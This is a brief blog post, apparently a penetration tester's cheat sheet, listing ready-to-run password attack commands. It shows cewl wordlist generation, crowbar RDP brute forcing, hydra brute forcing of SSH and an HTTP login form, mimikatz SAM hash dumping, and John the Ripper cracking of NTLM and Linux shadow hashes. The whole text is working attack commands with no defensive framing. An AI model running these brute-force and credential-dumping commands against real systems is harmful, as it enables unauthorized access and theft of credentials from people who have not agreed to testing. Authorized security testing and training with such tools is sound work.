---
layout: post
title:  "password attacks - general"
date:   2022-01-01
categories: password
---

## cewl generate list

```
cewl www.example.com -m 6 -w example-cewl.txt
```

## Remote Desktop Protocol Attack with Crowbar

```
crowbar -b rdp -s 10.10.10.10/32 -u admin -C ~/passwords.txt -n 1
```

## ssh

```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
```

## http post

```
hydra 10.10.10.10 http-form-post "/dir/login.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

## Retrieving Password Hashes windows mimikatz.exe

```bash
C:\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```

## password crack

- ntlm hash

```bash
sudo john hash.txt --format=NT
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```
- linux shadow

```bash
unshadow passwd-file.txt shadow-file.txt
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```